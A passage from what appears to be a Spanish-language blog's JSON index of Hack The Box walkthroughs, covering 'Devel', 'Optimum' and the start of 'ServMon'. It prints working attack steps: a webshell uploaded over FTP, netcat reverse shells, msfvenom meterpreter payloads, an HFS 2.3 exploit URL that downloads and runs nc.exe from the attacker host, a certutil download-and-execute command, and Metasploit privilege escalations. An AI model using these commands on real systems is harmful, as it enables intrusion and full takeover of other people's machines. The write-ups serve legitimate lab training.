02:06AM \u0026lt;DIR\u0026gt; aspnet_client 03-17-17 05:37PM 689 iisstart.htm 03-17-17 05:37PM 184946 welcome.png 226 Transfer complete. ftp\u0026gt; dir aspnet_client 200 PORT command successful. 125 Data connection already open; Transfer starting. 03-18-17 02:06AM \u0026lt;DIR\u0026gt; system_web 226 Transfer complete. ftp\u0026gt; dir aspnet_client/system_web 200 PORT command successful. 125 Data connection already open; Transfer starting. 03-18-17 02:06AM \u0026lt;DIR\u0026gt; 2_0_50727 226 Transfer complete. ftp\u0026gt; dir aspnet_client/system_web/2_0_50727 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. ftp\u0026gt; exit 221 Goodbye. HTTP Encontramos una pagina estatica en el puerto 80 relacionada a IIS7.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos, solamente vemos la carpeta que encontramos en FTP.\n1 2 λ ~/htb/devel gobuster dir -u http://10.10.10.5/ -w /usr/share/wordlists/dirb/common.txt -q -t 35 -x php,html,txt,xml,asp,aspx /aspnet_client (Status: 301) [Size: 155] [--\u0026gt; http://10.10.10.5/aspnet_client/] WEBSHELL Subimos una webshell en aspx que encontramos en kali /usr/share/webshells/aspx/ al servicio FTP, con el cual logramos ejecutar comandos.\n1 2 3 4 5 6 7 ftp\u0026gt; put cmdasp.aspx local: cmdasp.aspx remote: cmdasp.aspx 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 1442 bytes sent in 0.00 secs (38.2000 MB/s) ftp\u0026gt; SHELL Ejecutamos un servidor samba y con netcat (nc.exe) ejecutamos una shell inversa.\n1 2 3 4 5 6 7 8 # \\\\10.10.14.17\\share\\nc.exe -e cmd.exe 10.10.14.17 80 λ ~/htb/devel sudo rlwrap nc -lvp 80 listening on [any] 80 ... connect to [10.10.14.17] from 10.10.10.5 [10.10.10.5] 49159 Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation. All rights reserved. c:\\windows\\system32\\inetsrv\u0026gt; PRIVILEGE ESCALATION Realizamos una enumeracion con la herramienta Windows Exploit Suggester y encontramos que la version de la maquina (Windows 7 32-bit) podria ser vulnerable a multiples exploits, los que nos interesan son de Elevation of Privilege.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 λ ~/htb/devel python windows-exploit-suggester.py -i systeminfo -d 2021-05-11-mssb.xls [*] initiating winsploit version 3.3... [*] database file detected as xls or xlsx based on extension [*] attempting to read from the systeminfo input file [+] systeminfo input file read successfully (ascii) [*] querying database file for potential vulnerabilities [*] comparing the 0 hotfix(es) against the 179 potential bulletins(s) with a database of 137 known exploits [*] there are now 179 remaining vulns [+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin [+] windows version identified as \u0026#39;Windows 7 32-bit\u0026#39; [*] [M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical [M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important [E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical [*] http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP \u0026amp; EMET 5., PoC [*] http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP \u0026amp; EMET 5.0 Bypass (MS12-037), PoC [*] [E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important [M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important [M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical [E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important [E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important [M] MS10-015: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (977165) - Important [M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical [M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical [*] done Creamos un payload de meterpreter en x86, subimos esta en el servicio FTP y la \u0026ldquo;ejecutamos\u0026rdquo; visitando la direccion, obtuvimos una sesion meterpreter.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=80 -f aspx -o reverse.aspx λ ~/htb/devel sudo msfconsole -q msf6 \u0026gt; use multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) \u0026gt; set payload windows/x86/meterpreter/reverse_tcp [-] The value specified for payload is not valid. msf6 exploit(multi/handler) \u0026gt; set payload windows/meterpreter/reverse_tcp payload =\u0026gt; windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) \u0026gt; set lhost tun0 lhost =\u0026gt; tun0 msf6 exploit(multi/handler) \u0026gt; set lport 80 lport =\u0026gt; 80 msf6 exploit(multi/handler) \u0026gt; run [*] Started reverse TCP handler on 10.10.14.17:80 [*] Sending stage (175174 bytes) to 10.10.10.5 [*] Meterpreter session 1 opened (10.10.14.17:80 -\u0026gt; 10.10.10.5:49160) at 2021-05-11 02:10:21 -0400 meterpreter \u0026gt; getuid Server username: IIS APPPOOL\\Web Utilizamos el exploit MS10-015 que encontramos en metasploit, configuramos la sesion y LHOST, logramos obtener una shell con NT AUTHORITY\\SYSTEM.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 meterpreter \u0026gt; use exploit/windows/local/ms10_015_kitrap0d [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp msf6 exploit(windows/local/ms10_015_kitrap0d) \u0026gt; show options Module options (exploit/windows/local/ms10_015_kitrap0d): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on. Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: \u0026#39;\u0026#39;, seh, thread, process, none) LHOST 192.168.1.19 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Windows 2K SP4 - Windows 7 (x86) msf6 exploit(windows/local/ms10_015_kitrap0d) \u0026gt; set session 1 session =\u0026gt; 1 msf6 exploit(windows/local/ms10_015_kitrap0d) \u0026gt; set lhost tun0 lhost =\u0026gt; tun0 msf6 exploit(windows/local/ms10_015_kitrap0d) \u0026gt; run [*] Started reverse TCP handler on 10.10.14.17:4444 [*] Launching notepad to host the exploit... [+] Process 3188 launched. [*] Reflectively injecting the exploit DLL into 3188... [*] Injecting exploit into 3188 ... [*] Exploit injected. Injecting payload into 3188... [*] Payload injected. Executing exploit... [+] Exploit finished, wait for (hopefully privileged) payload execution to complete. [*] Sending stage (175174 bytes) to 10.10.10.5 [*] Meterpreter session 2 opened (10.10.14.17:4444 -\u0026gt; 10.10.10.5:49162) at 2021-05-11 02:18:47 -0400 meterpreter \u0026gt; getuid Server username: NT AUTHORITY\\SYSTEM meterpreter \u0026gt; Tambien realizamos la lectura de las flag user.txt y root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 meterpreter \u0026gt; shell Process 1216 created. Channel 1 created. Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Users\\Public\\Documents\u0026gt; cd C:\\Users C:\\Users\u0026gt;dir babis\\Desktop\\ dir babis\\Desktop\\ Volume in drive C has no label. Volume Serial Number is 8620-71F1 Directory of C:\\Users\\babis\\Desktop 18/03/2017 02:14 \u0026lt;DIR\u0026gt; . 18/03/2017 02:14 \u0026lt;DIR\u0026gt; .. 18/03/2017 02:18 32 user.txt.txt 1 File(s) 32 bytes 2 Dir(s) 22.273.224.704 bytes free C:\\Users\u0026gt;type babis\\Desktop\\user.txt.txt type babis\\Desktop\\user.txt.txt 9ecdd6a3aedf24b41562fea70f4cb3e8 C:\\Users\u0026gt;dir Administrator\\Desktop dir Administrator\\Desktop Volume in drive C has no label. Volume Serial Number is 8620-71F1 Directory of C:\\Users\\Administrator\\Desktop 14/01/2021 12:42 \u0026lt;DIR\u0026gt; . 14/01/2021 12:42 \u0026lt;DIR\u0026gt; .. 18/03/2017 02:17 32 root.txt 1 File(s) 32 bytes 2 Dir(s) 22.273.224.704 bytes free C:\\Users\u0026gt;type Administrator\\Desktop\\root.txt type Administrator\\Desktop\\root.txt e621a0b5041708797c4fc4728bc72b4b C:\\Users\u0026gt; ","description":"Devel expone un servicio FTP, por medio de este logramos subir una webshell para ejecucion de comandos. Para escalar privilegios obtuvimos informacion del comando systeminfo que posteriormente utilizamos con Windows Exploit Suggester para obtener acceso privilegiado utilizando el exploit MS10-015 con Metasploit.","id":64,"section":"posts","tags":["ftp","iis7","aspx","windows exploit suggester","MS10-015","metasploit"],"title":"Hack The Box - Devel","uri":"https://sckull.github.io/posts/devel/"},{"content":"\rOptimum es una maquina de HackTheBox, descubrimos una vulnerabilidad en HttpFileServer que nos dio acceso. Obtuvimos informacion de con SystemInfo, con Windows Exploit Suggester y Sherlock lo que nos permitió explotar MS16-032.\nInformacion de la Maquina Nombre Optimum OS Windows Puntos 20 Dificultad Facil IP 10.10.10.8 Maker ch4p\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[4.4, 5.1, 6.5, 3.5, 4.9],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} NMAP Escaneo de puertos con nmap nos muestra el puerto http (80) abierto.\n1 2 3 4 5 6 7 8 9 10 11 12 # Nmap 7.91 scan initiated Wed May 12 00:32:26 2021 as: nmap -Pn -p80 -sC -sV -oN port_scan 10.10.10.8 Nmap scan report for 10.10.10.8 (10.10.10.8) Host is up (0.070s latency). PORT STATE SERVICE VERSION 80/tcp open http HttpFileServer httpd 2.3 |_http-server-header: HFS 2.3 |_http-title: HFS / Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed May 12 00:32:35 2021 -- 1 IP address (1 host up) scanned in 8.66 seconds HTTP Encontramos una pagina en el puerto 80, donde vemos que esta corriendo HttpFileServer 2.3.\nUSER - KOSTAS HttpFileServer Encontramos un exploit que afecta a la version HttpFileServer 2.3.x, vemos que la version de HttpFileServer de Optimum está en el rango de version afectada, el exploit nos pide un servidor en el puerto 80 que contenga netcat (nc.exe). Ejecutamos el exploit y modificamos la direccion IP y Puerto para nuestra shell, logramos obtener una shell con el usuario kostas y la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 λ ~/htb/optimum sudo rlwrap nc -lvvp 443 listening on [any] 443 ... connect to [10.10.14.17] from 10.10.10.8 [10.10.10.8] 49166 Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\Users\\kostas\\Desktop\u0026gt; whoami optimum\\kostas C:\\Users\\kostas\\Desktop\u0026gt; dir Volume in drive C has no label. Volume Serial Number is D0BC-0196 Directory of C:\\Users\\kostas\\Desktop 18/05/2021 04:20 \u0026lt;DIR\u0026gt; . 18/05/2021 04:20 \u0026lt;DIR\u0026gt; .. 18/03/2017 03:11 760.320 hfs.exe 18/03/2017 03:13 32 user.txt.txt 2 File(s) 760.352 bytes 2 Dir(s) 31.882.153.984 bytes free C:\\Users\\kostas\\Desktop\u0026gt; type user.txt.txt d0c39409d7b994a9a1389ebf38ef5f73 C:\\Users\\kostas\\Desktop\u0026gt; El exploit crea el archivo script.vbs y en el escribe una solicitud de descarga de nc.exe, realiza la ejecucion del script y la ejecucion de una shell inversa.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # 1 http://10.10.10.8:80/?search=.{. save|C:\\Users\\Public\\script.vbs|dim xHttp: Set xHttp = createobject(\u0026#34;Microsoft.XMLHTTP\u0026#34;) dim bStrm: Set bStrm = createobject(\u0026#34;Adodb.Stream\u0026#34;) xHttp.Open \u0026#34;GET\u0026#34;, \u0026#34;http://10.10.14.17/nc.exe\u0026#34;, False xHttp.Send with bStrm .type = 1 \u0026#39;//binary .open .write xHttp.responseBody .savetofile \u0026#34;C:\\Users\\Public\\nc.exe\u0026#34;, 2 \u0026#39;//overwrite end with.} # 2 http://10.10.10.8:80/?search=.{. exec|cscript.exe C:\\Users\\Public\\script.vbs.} # 3 http://10.10.10.8:80/?search=.{. exec|C:\\Users\\Public\\nc.exe -e cmd.exe 10.10.14.17 443.} Tambien vemos un segundo exploit el cual ejecuta una shell inversa usando powershell.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con systeminfo y la herramienta Windows Exploit Suggester, obtuvimos una lista de posibles vulnerabilidades de escalacioin de privilegios, tambien ejecutamos Sherlock para verificar si alguno de los exploits encontrados aparecia vulnerable.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 Host Name: OPTIMUM OS Name: Microsoft Windows Server 2012 R2 Standard OS Version: 6.3.9600 N/A Build 9600 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Multiprocessor Free [... REDACTED ...] # python ../www/windows-exploit-suggester.py -i systeminfo.txt -d 2021-05-12-mssb.xls | grep Elevation [*] https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege [E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important [M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important [E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important [E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important [M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important [*] https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC [E] MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege (3023266) - Important [E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical [*] http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC [E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important Vemos MS16-032, MS16-034 y Win32k Elevation of Privilege que aparentemente es vulnerable.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 # powershell -nop -exec bypass -c \u0026#34;Import-Module .\\sherlock.ps1; Find-AllVulns\u0026#34; [... REDACTED ...] Title : Secondary Logon Handle MSBulletin : MS16-032 CVEID : 2016-0099 Link : https://www.exploit-db.com/exploits/39719/ VulnStatus : Appears Vulnerable Title : Windows Kernel-Mode Drivers EoP MSBulletin : MS16-034 CVEID : 2016-0093/94/95/96 Link : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1 6-034? VulnStatus : Appears Vulnerable Title : Win32k Elevation of Privilege MSBulletin : CVEID : 2016-7255 Link : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S ample-Exploits/MS16-135 VulnStatus : Appears Vulnerable MS16-032 Creamos un payload de meterpreter y colocamos a la escucha metasploit, descargamos y ejecutamos en la maquina el payload y logramos obtener una sesion meterpreter.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 # PAYLOAD: msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=8080 -f exe -o shell.exe # EXEC: certutil.exe -urlcache -f http://10.10.14.17/shell.exe shell.exe \u0026amp; shell.exe msf6 \u0026gt; use multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) \u0026gt; set payload windows/meterpreter/reverse_tcp payload =\u0026gt; windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) \u0026gt; set lhost tun0 lhost =\u0026gt; tun0 msf6 exploit(multi/handler) \u0026gt; set lport 80 msf6 exploit(multi/handler) \u0026gt; set lport 8080 lport =\u0026gt; 8080 msf6 exploit(multi/handler) \u0026gt; run -j [*] Exploit running as background job 0. [*] Exploit completed, but no session was created. [*] Started reverse TCP handler on 10.10.14.17:8080 msf6 exploit(multi/handler) \u0026gt; [*] Sending stage (175174 bytes) to 10.10.10.8 [*] Meterpreter session 1 opened (10.10.14.17:8080 -\u0026gt; 10.10.10.8:49192) at 2021-05-12 01:21:04 -0400 msf6 exploit(multi/handler) \u0026gt; msf6 exploit(multi/handler) \u0026gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 meterpreter x86/windows OPTIMUM\\kostas @ OPTIMUM 10.10.14.17:8080 -\u0026gt; 10.10.10.8:49192 (10.10.10.8) msf6 exploit(multi/handler) \u0026gt; sessions -i 1 [*] Starting interaction with 1... meterpreter \u0026gt; getuid Server username: OPTIMUM\\kostas Configuramos el exploit MS16-032 (ms16_032_secondary_logon_handle_privesc) con la sesion activa, ejecutamos y logramos obtener una shell NT AUTHORITY\\SYSTEM y la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 msf6 exploit(multi/handler) \u0026gt; use exploit/windows/local/ms16_032_secondary_logon_handle_privesc [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u0026gt; show options Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on. Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: \u0026#39;\u0026#39;, seh, thread, process, none) LHOST 192.168.1.21 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Windows x86 msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u0026gt; set session 1 session =\u0026gt; 1 msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u0026gt; set lhost tun0 lhost =\u0026gt; tun0 msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u0026gt; show options Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION 1 yes The session to run this module on. Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: \u0026#39;\u0026#39;, seh, thread, process, none) LHOST tun0 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Windows x86 msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u0026gt; run [*] Started reverse TCP handler on 10.10.14.17:4444 [+] Compressed size: 1016 [!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell [*] Writing payload file, C:\\Users\\kostas\\AppData\\Local\\Temp\\ZJtaKHP.ps1... [*] Compressing script contents... [+] Compressed size: 3592 [*] Executing exploit script... __ __ ___ ___ ___ ___ ___ ___ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -\u0026gt; @FuzzySec] [?] Operating system core count: 2 [\u0026gt;] Duplicating CreateProcessWithLogonW handle [?] Done, using thread handle: 2132 [*] Sniffing out privileged impersonation token.. [?] Thread belongs to: svchost [+] Thread suspended [\u0026gt;] Wiping current impersonation token [\u0026gt;] Building SYSTEM impersonation token [?] Success, open SYSTEM token handle: 2128 [+] Resuming thread.. [*] Sniffing out SYSTEM shell.. [\u0026gt;] Duplicating SYSTEM token [\u0026gt;] Starting token race [\u0026gt;] Starting process race [!] Holy handle leak Batman, we have a SYSTEM shell!! rvSZF4j6pWHx64CLwEtV13a20uTvKd0o [+] Executed on target machine. [*] Sending stage (175174 bytes) to 10.10.10.8 [*] Meterpreter session 2 opened (10.10.14.17:4444 -\u0026gt; 10.10.10.8:49193) at 2021-05-12 01:21:58 -0400 [+] Deleted C:\\Users\\kostas\\AppData\\Local\\Temp\\ZJtaKHP.ps1 meterpreter \u0026gt; getuid Server username: NT AUTHORITY\\SYSTEM meterpreter \u0026gt; shell Process 1896 created. Channel 1 created. Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\Users\\kostas\\Documents\u0026gt;cd C:\\users\\administrator\\desktop cd C:\\users\\administrator\\desktop C:\\Users\\Administrator\\Desktop\u0026gt;dir dir Volume in drive C has no label. Volume Serial Number is D0BC-0196 Directory of C:\\Users\\Administrator\\Desktop 18/03/2017 03:14 \u0026lt;DIR\u0026gt; . 18/03/2017 03:14 \u0026lt;DIR\u0026gt; .. 18/03/2017 03:14 32 root.txt 1 File(s) 32 bytes 2 Dir(s) 31.891.406.848 bytes free C:\\Users\\Administrator\\Desktop\u0026gt;type root.txt type root.txt 51ed1b36553c8461f4552c2e92b3eeed C:\\Users\\Administrator\\Desktop\u0026gt; ","description":"Optimum es una maquina de HackTheBox, descubrimos una vulnerabilidad en HttpFileServer que nos dio acceso. Obtuvimos informacion de con SystemInfo, con Windows Exploit Suggester y Sherlock lo que nos permitió explotar MS16-032.","id":65,"section":"posts","tags":["httpfileserver","windows exploit suggester","MS16-032","metasploit"],"title":"Hack The Box - Optimum","uri":"https://sckull.github.io/posts/optimum/"},{"content":"\rServMon una maquina de HackTheBox, encontramos una vulnerabilidad en NVMS lo que nos permitio obtener un wordlist que utilizamos con CrackMapExec para realizar Password spraying y obtener acceso por SSH. Finalmente encontramos NSClient lo que nos llevo a realizar un Tunnel con SSH para obtener el puerto localmente y explotar una vulnerabilidad que nos dio acceso privilegiado.\nInformacion de la Maquina Nombre ServMon OS Windows Puntos 20 Dificultad Facil IP 10.10.10.184 Maker del_KZx497Ju\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[5, 4.8, 7.4, 2.6, 5.2],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} NMAP Escaneo de puertos con nmap nos muestra multiples puertos abiertos: ftp (21), ss h(22), http (80), smb (139, 445), RPC (135).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 # Nmap 7.91 scan initiated Wed May 12 19:53:55 2021 as: nmap -Pn -p21,22,80,135,139,445,5040,5666,6063,6699,7680,49664,49665,49666,49667,49668,49669,49670 -sC -sV -oN port_scan 10.10.10.184 Nmap scan report for 10.10.10.184 (10.10.10.184) Host is up (0.096s latency). PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_01-18-20 12:05PM \u0026lt;DIR\u0026gt; Users | ftp-syst: |_ SYST: Windows_NT 22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0) | ssh-hostkey: | 2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA) | 256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA) |_ 256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519) 80/tcp open http | fingerprint-strings: | GetRequest, HTTPOptions, RTSPRequest: | HTTP/1.1 200 OK | Content-type: text/html | Content-Length: 340 | Connection: close | AuthInfo: | \u0026lt;!DOCTYPE html PUBLIC \u0026#34;-//W3C//DTD XHTML 1.0 Transitional//EN\u0026#34; \u0026#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\u0026#34;\u0026gt; | \u0026lt;html xmlns=\u0026#34;http://www.w3.org/1999/xhtml\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; | \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; | window.location.href = \u0026#34;Pages/login.htm\u0026#34;; | \u0026lt;/script\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;/body\u0026gt; | \u0026lt;/html\u0026gt; | NULL: | HTTP/1.1 408 Request Timeout | Content-type: text/html | Content-Length: 0 | Connection: close |_ AuthInfo: |_http-title: Site doesn\u0026#39;t have a title (text/html). 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 5040/tcp open unknown 5666/tcp open tcpwrapped 6063/tcp open tcpwrapped 6699/tcp open napster? 7680/tcp open pando-pub? 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port80-TCP:V=7.91%I=7%D=5/12%Time=609C6A98%P=x86_64-pc-linux-gnu%r(NULL SF:,6B,\u0026#34;HTTP/1\\.1\\x20408\\x20Request\\x20Timeout\\r\\nContent-type:\\x20text/ht SF:ml\\r\\nContent-Length:\\x200\\r\\nConnection:\\x20close\\r\\nAuthInfo:\\x20\\r\\n SF:\\r\\n\u0026#34;)%r(GetRequest,1B4,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\r\\nContent-type:\\x20tex SF:t/html\\r\\nContent-Length:\\x20340\\r\\nConnection:\\x20close\\r\\nAuthInfo:\\x SF:20\\r\\n\\r\\n\\xef\\xbb\\xbf\u0026lt;!DOCTYPE\\x20html\\x20PUBLIC\\x20\\\u0026#34;-//W3C//DTD\\x20X SF:HTML\\x201\\.0\\x20Transitional//EN\\\u0026#34;\\x20\\\u0026#34;http://www\\.w3\\.org/TR/xhtml1/D 